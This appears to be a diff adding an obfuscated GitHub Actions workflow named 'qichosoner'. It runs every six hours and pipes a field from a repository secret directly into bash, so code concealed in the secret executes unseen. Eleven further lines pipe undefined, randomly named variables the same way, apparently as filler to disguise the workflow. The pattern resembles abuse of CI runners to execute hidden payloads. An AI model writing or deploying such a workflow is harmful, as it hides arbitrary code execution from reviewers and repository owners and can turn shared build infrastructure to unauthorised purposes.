@@ -1,0 +1,27 @@
+name: qichosoner
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qichosoner
+        env:
+          o5: ${{ secrets.o5 }}
+        run: |
+          echo $o5 | jq -r .m4 | /bin/bash
+          echo $eylk8015 | jq -r .usvpe762 | /bin/bash
+          echo $r4 | jq -r .wyxgm90 | /bin/bash
+          echo $bap92340 | jq -r .sumna9 | /bin/bash
+          echo $sjvqx58201 | jq -r .ttjjg17258 | /bin/bash
+          echo $liioi58 | jq -r .l93272 | /bin/bash
+          echo $l627 | jq -r .bfc46113 | /bin/bash
+          echo $jnbkd45511 | jq -r .q6522 | /bin/bash
+          echo $b5 | jq -r .lm03783 | /bin/bash
+          echo $pi5 | jq -r .vav937 | /bin/bash
+          echo $iheh797 | jq -r .hp727 | /bin/bash
+          echo $idvk82 | jq -r .li18291 | /bin/bash
+
